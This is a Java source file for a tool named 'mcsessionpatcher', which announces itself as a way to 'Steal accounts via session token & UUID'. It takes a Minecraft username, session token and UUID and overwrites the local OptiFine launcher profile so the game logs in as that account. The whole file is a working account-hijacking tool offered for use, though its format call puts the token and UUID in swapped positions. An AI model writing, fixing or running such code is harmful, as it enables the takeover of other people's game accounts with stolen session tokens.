import javax.swing.JOptionPane;
import java.io.*;
import java.lang.*;
import java.util.*;

public class SessionPatcher 
{
	public static final String homeDirectory = System.getProperty("user.home");
	
	public static enum OSType
	{
		Windows,
		Mac,
		Linux,
		Unknown
	}
	
	public static final String optifineFileString = "{\n"
			+ "  \"id\": \"1.12.2-OptiFine_HD_U_G5\",\n"
			+ "  \"inheritsFrom\": \"1.12.2\",\n"
			+ "  \"time\": \"2021-08-30T23:10:30-05:00\",\n"
			+ "  \"releaseTime\": \"2021-08-30T23:10:30-05:00\",\n"
			+ "  \"type\": \"release\",\n"
			+ "  \"libraries\": [\n"
			+ "    {\n"
			+ "      \"name\": \"optifine:OptiFine:1.12.2_HD_U_G5\"\n"
			+ "    },\n"
			+ "    {\n"
			+ "      \"name\": \"optifine:launchwrapper-of:2.2\"\n"
			+ "    }\n"
			+ "  ],\n"
			+ "  \"mainClass\": \"net.minecraft.launchwrapper.Launch\",\n"
			+ "  \"minecraftArguments\": \"--username %s --version ${version_name} --gameDir ${game_directory} --assetsDir ${assets_root} --assetIndex ${assets_index_name} --uuid %s --accessToken %s --userType ${user_type} --versionType ${version_type}  --tweakClass optifine.OptiFineTweaker\"\n"
			+ "}";

	public static String getInput(String msg)
	{
		return JOptionPane.showInputDialog(msg);
	}
	
	public static void showMessage(String title, String message)
	{
		JOptionPane.showMessageDialog(null, message, title, JOptionPane.INFORMATION_MESSAGE);
	}
	
	public static String generateOptifineConfig(String username, String session, String uuid)
	{
		return String.format(optifineFileString,
			username,
			session,
			uuid
		);
	}
	
	public static OSType getOS()
	{
		String osString = System.getProperty("os.name");
		
		if (osString.contains("Windows"))
			return OSType.Windows;
		
		if (osString.contains("Linux"))
			return OSType.Linux;
		
		if (osString.contains("Mac"))
			return OSType.Mac;
		
		return OSType.Unknown;
	}
	
	public static void overwriteOptifineConfig(OSType os, String what) throws Exception
	{
		String path = homeDirectory + File.separator;
		
		switch (os)
		{
			case Windows:
			{
				path += "AppData\\Roaming\\.minecraft\\versions\\1.12.2-OptiFine_HD_U_G5\\1.12.2-OptiFine_HD_U_G5.json";
				break;
			}
			
			case Linux:
			{
				path += ".minecraft/versions/1.12.2-OptiFine_HD_U_G5/1.12.2-OptiFine_HD_U_G5.json";
				break;
			}
			
			case Mac:
			{
				path += "Library/Application Support/minecraft/versions/1.12.2-OptiFine_HD_U_G5/1.12.2-OptiFine_HD_U_G5.json";
				break;
			}
		}
		
		System.out.println(path);
		
		File optifineFile = new File(path);
		if (!optifineFile.exists())
			throw new FileNotFoundException("You must have optifine installed.");
		
		FileWriter fw = new FileWriter(optifineFile, false);
		
		fw.write(what);
		fw.flush();
		fw.close();
	}
	
	public static void guiMode() throws Exception
	{
		String username = getInput("Username?: ");
		String session = getInput("Session/Token?: ");
		String uuid = getInput("UUID?: ");
	
		String optifineString = generateOptifineConfig(username, session, uuid);
		
		try
		{
			overwriteOptifineConfig(getOS(), optifineString);
		}
		catch (FileNotFoundException ex)
		{
			showMessage("Error!", "You must have Optifine 1.12.2-G5 HD installed for this to work!");
		}
	}
	
	public static void cliMode(String username, String session, String uuid) throws Exception
	{
		String optifineString = generateOptifineConfig(username, session, uuid);
		
		try
		{
			overwriteOptifineConfig(getOS(), optifineString);
		}
		catch (FileNotFoundException ex)
		{
			System.out.println("Error: you must have Optifine 1.12.2-G5 installed for this to work--and you don't!");
		}
	}
	
	public static final String usageMessage = "USAGE: \n"
			+ "ARGS: \n"
			+ "nothing - Launch this application in GUI user-friendly mode, \n"
			+ "username session uuid (in that order) - replace using command-line. \n"
			+ "END\n";
			
	
	public static void main(String[] args) throws Exception
	{
		System.out.println("mcsessionpatcher - Steal accounts via session token & UUID");
		System.out.println(usageMessage);
		
		
		if (args.length >= 1)
		{
			if (args.length != 3)
			{
				System.out.println("Error: You must provide the username, session ID, and UUID (in that order). ");
				return;
			}
			
			cliMode(args[0], args[1], args[2]);
		}
		else
		{
			guiMode();
		}
		
	}

}
